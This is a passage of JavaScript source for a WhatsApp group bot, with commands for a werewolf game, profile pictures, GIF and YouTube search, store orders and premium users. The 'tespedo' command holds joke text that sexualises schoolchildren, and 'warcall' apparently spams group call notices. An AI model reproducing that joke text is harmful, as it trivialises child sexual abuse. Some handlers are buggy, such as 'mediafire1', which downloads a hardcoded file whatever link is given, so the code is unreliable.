        return reply("Kamu sudah mati");
    if (!target || target.length < 1) return reply("Masukan nomor player");
    if (isNaN(target)) return reply("Gunakan hanya nomor");
    let byId = getPlayerById2(sender, parseInt(target), ww);
    if (byId.db.isdead === true) return reply("Player sudah mati");
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri");
    if (byId === false) return reply("Player tidak terdaftar");
    if (value === "kill") {
        if (dataPlayer(sender, ww).role !== "werewolf")
            return reply("Peran ini bukan untuk kamu");
        if (byId.db.role === "sorcerer")
            return reply("Tidak bisa menggunakan skill untuk teman");
        return m
            .reply("Berhasil membunuh player " + parseInt(target))
            .then(() => {
                dataPlayer(sender, ww).status = true;
                killWerewolf(sender, parseInt(target), ww);
            });
    } else if (value === "dreamy") {
        if (dataPlayer(sender, ww).role !== "seer")
            return reply("Peran ini bukan untuk kamu");
        let dreamy = dreamySeer(m.sender, parseInt(target), ww);
        return m
            .reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    } else if (value === "deff") {
        if (dataPlayer(sender, ww).role !== "guardian")
            return reply("Peran ini bukan untuk kamu");
        return reply(`Berhasil melindungi player ${target}`)
        .then(() => {
            protectGuardian(m.sender, parseInt(target), ww);
            dataPlayer(sender, ww).status = true;
        });
    } else if (value === "sorcerer") {
        if (dataPlayer(sender, ww).role !== "sorcerer")
            return reply("Peran ini bukan untuk kamu");
        let sorker = sorcerer(sesi(m.sender), target);
        return m
            .reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    }
}
break
//==================================================================
case 'setpppanjang': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
			let botNumber = await RyuuBotz.decodeJid(RyuuBotz.user.id)
			let { img } = await pepe(media)
			await RyuuBotz.query({
				tag: 'iq',
				attrs: {
					to: botNumber,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Sukses mengganti PP Bot`)
		} catch (e) {
			console.log(e)
			reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
//==================================================================
case 'setpppgcanjang': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
			let { img } = await pepe(media)
			await RyuuBotz.query({
				tag: 'iq',
				attrs: {
					to: m.chat,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Admin @${(m.sender || '').replace(/@s\.whatsapp\.net/g, '')} telah mengganti Icon Group!`, null, { mentions: [m.sender] })
		} catch (e) {
			console.log(e)
			reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
//=========================================\\
case 'tenor': {
function isValidURL(message) {
    const urlPattern = /https?:\/\/[^\s/$.?#].[^\s]*/;
    return urlPattern.test(message);
}

async function getTemplateImageUrl(input, number) {
    try {
        const data = await (await fetch(`https://g.tenor.com/v1/search?q=${input}&key=LIVDSRZULELA`)).json();
        const selectedId = data.results[number - 1];
        return {
            one: selectedId,
            all: data.results
        };
    } catch (error) {
        console.error("Error fetching data:", error);
        return "Error fetching data.";
    }
}
    let [tema, urutan] = text.split(/[^\w\s]/g)
    if (!tema) return reply("*Contoh:*\n.tenor [tema]|[angka]")
    if (!urutan) return reply("*Contoh:*\n.tenor [tema]|[angka]")
    if (isNaN(urutan)) return reply("*Contoh:*\n.tenor [tema]|[angka]")
    await reply(mess.wait)
    try {
        let json = await getTemplateImageUrl(tema, urutan)
        let data = json.one
        let all = json.all
        if (urutan > all.length) return reply("Input query!\n*Contoh:*\n.tenor [tema]|[angka]\n\n*Pilih angka yg ada*\n" + all.map((item, index) => `*${index + 1}.* ${item.content_description}`).join("\n"))
        if (isValidURL(data.media[0].mp4.url)) {
            let caption = `🔍 *[ HASIL ]*

🆔 *ID:* ${data.id}
🌐 *URL:* ${data.url}
📋 *Description:* ${data.content_description}
📌 *Item:* ${data.itemurl}`
            await RyuuBotz.sendMessage(m.chat, {
                video: {
                    url: data.media[0].mp4.url
                },
                caption: caption,
                gifPlayback: true,
                gifAttribution: 2
            }, {
                quoted: m
            })
        }
    } catch (e) {
        await reply(eror)
    }
}
break

//===============Store-Menu================\\
case 'list': case 'store':{
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
let teks = `Halo @${m.sender.split("@")[0]} berikut beberapa list yang tersedia saat ini.\n\n`
for (let i of db_respon_list) {
if (i.id === m.chat) {
teks += `- ${i.key.toUpperCase()}\n`
}
}
teks += `\n\nUntuk melihat detail produk, silahkan kirim nama produk yang ada pada list di atas. Misalnya kamu ingin melihat detail produk dari ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} kepada bot`
RyuuBotz.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m}) 
}
break
case 'dellist':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *key*\n\n_Contoh_\n\n${prefix + command} hello`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
case 'addlist':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
let media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
                let mem = await uploadwidipe(media)
addResponList(m.chat, args1, args2, true, mem, db_respon_list)
reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
reply(`Sukses set list message dengan key : *${args1}*`)
}
break
case 'updatelist': case 'update':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
let media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
                let mem = await uploadwidipe(media)
updateResponList(m.chat, args1, args2, true, mem, db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
}
break
case 'tespedo': {
  const levels = [
    '📊 Level 0: Lu kagak pedo\nLu itu penyuka Tobvrut + montoq 🤨',
    '📊 Level 1: Tukang Adzan\nBaru liat cewek SD senyum, langsung ambil wudhu.',
    '📊 Level 2: Liat Samping\nNgintip doang kalo temen buka galeri foto adik kecilnya.',
    '📊 Level 3: Mode Tipis-Tipis\nNgasih bunga ke anak SD berkedok Sahabat',
    '📊 Level 4: Pengamat Gaya Rambut\nSuka cewek dari belahan rambutnya doang.',
    '📊 Level 5: Ngiler Sandal\nSaking ngebetnya, liat sandal cewek di sekolah aja bisa senyum² sendiri.',
    '📊 Level 6: Tangan Gatal\nLike semua postingan dia dari tahun 2018, tengah malam pula nyambil bayangin sesuatu 🤨',
    '📊 Level 7: FBI Watchlist\nNgaku "wibu sejati", tapi koleksi karakter favoritnya masih SD semua.',
    '📊 Level 8: Pecinta Seragam\nLiat seragam SMP langsung auto zoom 400x ampe keliatan jelas anu nya :v',
    '📊 Level 9: Mode Bucin 404\nSuka buka p*rnh*b buat liat bocah.',
    '📊 Level 10: Udah gila\nKamu aja bisa sange sama semut. Nikahin aja semutnya sekalian 😭'
  ]
  const hasil = levels[Math.floor(Math.random() * levels.length)]
  replyryuu(`💢 *Hasil Tes P*do kamu:*\n\n${hasil}`)
}
break;
case 'tambah':{
if (!text.includes('+')) return reply(`Gunakan dengan cara ${prefix+command} *angka* + *angka*\n\n_Contoh_\n\n${prefix+command} 1+2`)
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one + nilai_two}`)}
break
case '.kurang':{
if (!text.includes('-')) return reply(`Gunakan dengan cara ${prefix+command} *angka* - *angka*\n\n_Contoh_\n\n${prefix+command} 1-2`)
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one - nilai_two}`)}
break
case '.kali':{
if (!text.includes('*')) return reply(`Gunakan dengan cara ${prefix+command} *angka* * *angka*\n\n_Contoh_\n\n${prefix+command} 1*2`)
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one * nilai_two}`)}
break
case '.bagi':{
if (!text.includes('/')) return reply(`Gunakan dengan cara ${prefix+command} *angka* / *angka*\n\n_Contoh_\n\n${prefix+command} 1/2`)
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one / nilai_two}`)}
break
case 'setproses': case 'setp':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) return reply(`Set proses already active`)
addSetProses(text, m.chat, set_proses)
reply(`✅ Done set proses!`)
break
case 'changeproses': case 'changep':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) {
changeSetProses(text, m.chat, set_proses)
reply(`Sukses ubah set proses!`)
} else {
addSetProses(text, m.chat, set_proses)
reply(`Sukses ubah set proses!`)
}
break
case 'delsetproses': case 'delsetp':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!isSetProses(m.chat, set_proses)) return reply(`Belum ada set proses di gc ini`)
removeSetProses(m.chat, set_proses)
reply(`Sukses delete set proses`)
break
case 'setdone':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) return reply(`Udh set done sebelumnya`)
addSetDone(text, m.chat, set_done)
reply(`Sukses set done!`)
break
}
case 'changedone': case 'changed':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) {
changeSetDone(text, m.chat, set_done)
reply(`Sukses ubah set done!`)
} else {
addSetDone(text, m.chat, set_done)
reply(`Sukses ubah set done!`)
}
break
case 'delsetdone': case 'delsetd':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!isSetDone(m.chat, set_done)) return reply(`Belum ada set done di gc ini`)
removeSetDone(m.chat, set_done)
reply(`Sukses delete set done`)
break
case'proses':{
  if (!m.isGroup) return reply('Fitur Khusus Group!')
			if (!m.quoted) return reply('Reply pesanan yang akan proses')
            let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
            let proses = `── 「 *DETAIL PESANAN* 」 ──\n\n\`\`\`› Status : 「 Transaksi Pending 」\n› Pesanan : @user\n› Date : @tanggal\n› Clock : @jam\n› Status Pesanan : Diproses ⌛\n› Catatan Pesanan 📝 :\`\`\`\n*@pesanan*\n\n_*Tunggu Sebentar, Orderan Kamu Sedang Diproses Oleh Admin @admin.*_`
            const getTextP = getTextSetProses((m.isGroup? m.chat: botNumber), set_proses);
            if (getTextP !== undefined) {
            	var anunya = (getTextP.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@admin', pushname).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
                RyuuBotz.sendTextWithMentions(m.chat, anunya, m)
            } else {
   RyuuBotz.sendTextWithMentions(m.chat, (proses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@admin', pushname).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)
            }
            }
            break
            case 'd': case'done':{
      if (!m.isGroup) return reply('Fitur Khusus Group!')
			if (!m.quoted) return reply('Reply pesanan yang telah di proses')
            let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
            let sukses = `── 「 *DETAIL PESANAN* 」 ──\n\n\`\`\`› Status : 「 Transaksi Success 」\n› Pesanan : @user\n› Date : @tanggal\n› Clock : @jam\n› Status Pesanan : Terkirim ✅\n› Catatan Pesanan 📝 :\`\`\`\n*@pesanan*\n\n_*Terimakasih sudah order di @group*_\n*_kami tunggu orderan berikutnya_* 🤗🤗`            
            const getTextD = getTextSetDone((m.isGroup? m.chat: botNumber), set_done);
            if (getTextD !== undefined) {
            	var anunya = (getTextD.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@admin', pushname).replace('@group', groupMetadata.subject).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
            	RyuuBotz.sendTextWithMentions(m.chat, anunya, m)
               } else {
               	RyuuBotz.sendTextWithMentions(m.chat, (sukses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@admin', pushname).replace('@group', groupMetadata.subject).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)
               }
   }
   break
//=========================================\\	
case 'gptimg':
case 'bingimg': {
if (!isPrem) return replyprem(mess.premium)
if (!text) return reply('Promt Nya Bos...')
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
 RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
    } catch (error) {
reply('eror')
    }
}
break
//=========================================\\	
case 'smeta': {
if (!/webp/.test(mime)) return replyReinzID('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await RyuuBotz.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replyReinzID('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `ReinzID BotID`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) RyuuBotz.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replyReinzID('reply sticker')
                                                                              }
                                                                              }       
                                                                              break
			case 'gimage': {
if (!text) return replyReinzID(`Contoh : ${prefix + command} carry minati`)
reply(mess.wait)
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
 RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
    } catch (error) {
reply('eror')
    }
}
        break
			case 'mediafire1': {
	if (args.length == 0) return replyReinzID(`Dimana linknya?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replyReinzID(`The link you provided is invalid`)
	const text = 'https://www.mediafire.com/file/xdw0j1tugxknsdi/Aspira-Bot-V2.8-Free.zip'
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	console.log(baby1)
	if (baby1[0].size.split('MB')[0] >= 10000) return replyReinzID('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
replyReinzID(`${result4}`)
RyuuBotz.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'tiktokxx':{ 
if (!text) return replyReinzID( `Contoh : ${prefix + command} link`)
if (!q.includes('tiktok')) return replyReinzID(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
RyuuBotz.sendMessage(m.chat, { caption: `Ini dia!!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokaudioxx':{
if (!text) return replyReinzID( `Contoh : ${prefix + command} link`)
if (!q.includes('tiktok')) return replyReinzID(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
RyuuBotz.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'google': {
if (!q) return replyReinzID(`Contoh : ${prefix + command} ${botname}`)
reply(mess.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replyReinzID(teks)
})
}
break
case 'happymod':{
if (!q) return replyReinzID(`Contoh ${prefix+command} Sufway surfer mod`)
RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let kat = await scp1.happymod(q)
replyReinzID(util.format(kat))
}
break
case 'yts': case 'ytsearch': {
if (!text) return replyReinzID(`Contoh : ${prefix + command} story wa anime`);
const yts = require('yt-search');
async function searchYouTube(text) {
    let search = await yts(text);
    let teks = `🔎 YouTube Search\n\nHasil Pencarian dari: ${text}\n\n`;
    let no = 1;
    let hasilPencarian = search.all.map(v => `${no++}. ${v.title}\n[Link]: ${v.url}`).join('\n\n');
    teks += hasilPencarian;
    await RyuuBotz.sendMessage(m.chat, { text: teks }, { quoted: m });
}
searchYouTube(text);
          }
            break
case 'yts2': case 'ytsearch2': {
if (!text) return replyReinzID(`Contoh : ${prefix + command} story wa anime`)
const yts = require('yt-search');
async function searchYouTube(text) {
    let search = await yts(text);
    let teks = `🔎 YouTube Search\n\n Hasil Pencarian dari: ${text}\n\n`;
    let no = 1;
    let caption = search.all.map((v, i) => {
        return {
            header: "",
            title: v.title,
            description: `[ ytmp4 ] Link: ${v.url}`,
            id: '.ytmp4 ' + v.url
        };
    });

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: {
                        text: `🔎 Hasil Pencarian Dari ${text}\nSilahkan Pilih List di bawah ini`
                    },
                    footer: {
                        text: botname
                    },
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: search.all[0].thumbnail } }, { upload: RyuuBotz.waUploadToServer })),
          title: '',
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "CLICK HERE",
                                    sections: [
                                        {
                                            title: "",
                                            rows: caption
                                        }
                                    ]
                                })
                            }
                        ]
                    }
                }
            }
        }
    }, { quoted: m }, {});
    await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
searchYouTube(text)
          }
            break
            case 'yts3': case 'ytsearch3': {
if (!text) return replyReinzID(`Contoh : ${prefix + command} story wa anime`)
const yts = require('yt-search');
async function searchYouTube(text) {
    let search = await yts(text);
    let teks = `🔎 YouTube Search\n\n Hasil Pencarian dari: ${text}\n\n`;
    let no = 1;
    let caption = search.all.map((v, i) => {
        return {
            header: "",
            title: v.title,
            description: `[ ytmp4 ] Link: ${v.url}`,
            id: '.ytmp3' + v.url
        };
    });

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: {
                        text: `🔎 Hasil Pencarian Dari ${text}\nSilahkan Pilih List di bawah ini`
                    },
                    footer: {
                        text: botname
                    },
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: search.all[0].thumbnail } }, { upload: RyuuBotz.waUploadToServer })),
          title: '',
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "CLICK HERE",
                                    sections: [
                                        {
                                            title: "",
                                            rows: caption
                                        }
                                    ]
                                })
                            }
                        ]
                    }
                }
            }
        }
    }, { quoted: m }, {});
    await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
searchYouTube(text)
          }
            break
case 'warcall': {
 if (!m.isGroup) return reply(mess.only.group)
if(!text) return reply(`contoh: \n.warcall kontol`)
RyuuBotz.relayMessage(m.chat, {
scheduledCallCreationMessage: {
callType: 2,
scheduledTimestampMs:  Date.now(),
title: text
}
}, {})
}
break
case 'xxxxplay':{
if (!text) return replyReinzID(`Contoh : ${prefix+command} story wa anime`)
reply(mess.wait)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = `${ownernumber}@s.whatsapp.net`
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Link : ${anu.url}

Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`
RyuuBotz.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
}
break
//=========================================\\
case "addprem": {
  if (!isRyuuTheCreator) return reply(mess.only.owner);
  if (!args[0]) return replyReinzID(`Gunakan format:\n${prefix + command} nomor|durasi(hari)\nContoh: ${prefix + command} 628xxx|30`);

  const [num, dur] = q.split("|");
  const id = `${num.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
  const duration = dur?.toLowerCase() === 'permanent' ? 'Infinity' : parseInt(dur || '30');

  if (duration !== 'Infinity' && isNaN(duration)) return replyReinzID("Durasi tidak valid!");

  const expired = duration === 'Infinity' ? "Infinity" : Date.now() + duration * 86400000;

  const existing = prem.find(p => p.id === id);
  if (existing) {
    existing.expired = expired;
  } else {
    prem.push({ id, expired });
  }

  fs.writeFileSync("./node_modules/Arisu-MD/database/premium.json", JSON.stringify(prem, null, 2));
  replyReinzID(`✅ ${id} telah menjadi premium!\nMasa berlaku: ${expired === "Infinity" ? 'Permanent' : new Date(expired).toLocaleString()}`);
}
break;
      //=========================================\\
      case "delprem": {
  if (!isRyuuTheCreator) return reply(mess.only.owner);
  if (!args[0]) return replyReinzID(`Gunakan: ${prefix + command} 628xxx`);

  const id = `${q.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
  const index = prem.findIndex(p => p.id === id);
  if (index !== -1) prem.splice(index, 1);

  fs.writeFileSync("./node_modules/Arisu-MD/database/premium.json", JSON.stringify(prem, null, 2));
  replyReinzID(`✅ Akses premium untuk ${id} telah dihapus.`);
}
break;
case 'c-atm': 
case 'catm': 
case 'create-atm':
case 'createatm': {
  try {
  const user = global.db.users[m.sender]
    if (user.atm > 0) return replyReinzID('Kamu sudah memiliki ATM 💳');

    user.atm = 1;
    user.fullatm = 500000000;

    replyReinzID("Sukses membuat 1 ATM 💳 tanpa biaya apapun!");
  } catch (err) {
    replyReinzID("Terjadi kesalahan:\n\n" + err.stack);
  }
  }
  break;
case 'listprem':
case "premlist": {
  if (!isRyuuTheCreator) return reply(mess.only.owner);

  if (prem.length === 0) return replyReinzID("📭 Tidak ada user premium terdaftar.");

  let listprem = `*📜 LIST PENGGUNA PREMIUM ${global.botname}*\n\nTotal Premium: ${prem.length}\n`;
  let no = 1;

  for (let user of prem) {
    let expiredText =
      user.expired === "Infinity"
        ? "Permanent ♾️"
        : new Date(user.expired).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    listprem += `\n${no++}. ${user.id}\n   ⏳ Expires: ${expiredText}\n`;
  }

  listprem += `\n\n🗑 Untuk menghapus premium: ${prefix}delprem 628xxx/@tag`;

  RyuuBotz.sendMessage(m.chat, { text: listprem }, { quoted: RyuuBotz.chat });
}
break;
case 'me2':
case 'myprofile':
case 'profil':
case 'prof':
case 'profile': {
  const fs = require('fs')
  const prem = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/premium.json'))
  const now = Date.now()
  const userPremium = prem.find(user => user.id === m.sender)

  function msToTime(ms) {
    const days = Math.floor(ms / (24 * 60 * 60 * 1000))
    const daysms = ms % (24 * 60 * 60 * 1000)
    const hours = Math.floor(daysms / (60 * 60 * 1000))
    const hoursms = ms % (60 * 60 * 1000)
    const minutes = Math.floor(hoursms / (60 * 1000))
    return `${days}d, ${hours}h, ${minutes}m`
  }

  const sisaWaktu = (!userPremium || userPremium.expired <= now) ? 'Non Premium' : msToTime(userPremium.expired - now)
  const isPrem = (!userPremium || userPremium.expired <= now) ? false : true
  const namaUser = m.pushName || m.sender.split("@")[0]

  const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? RyuuBotz.user.jid : m.sender;
  const user = global.db.users[who] || {}
  const owner = isRyuuTheCreator ? 'Owner Terhormat' : "Pengguna biasa"

  let url
  try {
    url = await RyuuBotz.profilePictureUrl(who, 'image')
  } catch {
    url = 'https://files.catbox.moe/xjvuja.jpg'
  }

  const teks = `
╭───[ 👤 *PROFILE KAMU* ]──
│
│ 📛 *Nama*         : ${user.registered ? user.name : await RyuuBotz.getName(who)}
│ 🏅 *Level*        : ${user.level || '0'}
│ 🔋 *Limit*        : ${isPrem ? 'Unlimited' : user.limit || '0'}
│ 💸 *Uang*         : ${user.money || '0'}
│ 🎖️ *Status*      : ${isPrem ? "Premium User" : "Free User"}
│ ⏳ *Sisa Premium* : ${sisaWaktu}
│ 🏆 *Kepemilikan*  : ${owner}
│ 📱 *Nomor*        : @${who.split('@')[0]}
│
╰────────────────────`.trim()

  /*await RyuuBotz.sendMessage(m.chat, {
    image: { url },
    caption: teks,
    mentions: [who]
  }, { quoted: m })*/
  
    await RyuuBotz.sendMessage(m.chat, {
  text: teks,
  contextInfo: {
    mentionedJid: [who],
    externalAdReply: {
      title: 'Your profile',
